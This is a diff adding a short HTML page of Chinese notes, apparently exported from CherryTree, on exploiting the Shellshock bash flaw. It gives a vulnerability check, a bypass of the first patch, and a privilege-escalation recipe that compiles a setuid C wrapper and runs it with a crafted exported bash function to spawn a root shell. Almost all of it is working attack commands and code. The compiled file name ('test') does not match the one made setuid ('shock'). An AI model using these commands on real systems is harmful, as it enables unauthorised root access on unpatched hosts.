@@ -1,0 +1,8 @@
+<!doctype html><html>
+    <head>
+      <meta http-equiv="content-type" content="text/html; charset=utf-8">
+      <title>Shellshock破壳</title>
+      <meta name="generator" content="CherryTree">
+      <link rel="stylesheet" href="res/styles3.css" type="text/css" />
+    </head>
+    <body><div class='page'><h1 class='title'>Shellshock破壳</h1><br/>前提：bash版本不大于4.1<br /><br />bash -version 查看版本<br /><br />检测：<br />env x=&#39;() { :;}; echo vulnerable&#39; bash -c &quot;echo this is a test&quot;<br /><br />绕过第一个补丁检测：<br />env X=&#39;() { (a)=&gt;\&#39; sh -c &quot;echo date&quot;; cat echo<br /><br />看是否生成了echo文件<br /><br /><br /><br />提权：<br /><div class="codebox"><div class="codebox">#include&nbsp;&lt;stdio.h&gt;<br />void&nbsp;main()<br />{<br />setuid(geteuid());<br />system(&quot;/bin/ls&nbsp;-l&quot;);<br />}</div></div><br />root:<br />gcc -o test test.c<br />chmod u+s shock<br /><br />test:<br />export foo=&#39;( ) { :; };bash&#39;<br />./test<br /><br /><br /><br /><br /><br /><p align="center"><img src="images\home.svg" height="22" width="22">  <a href="index.html">索引</a></p></div></body></html>
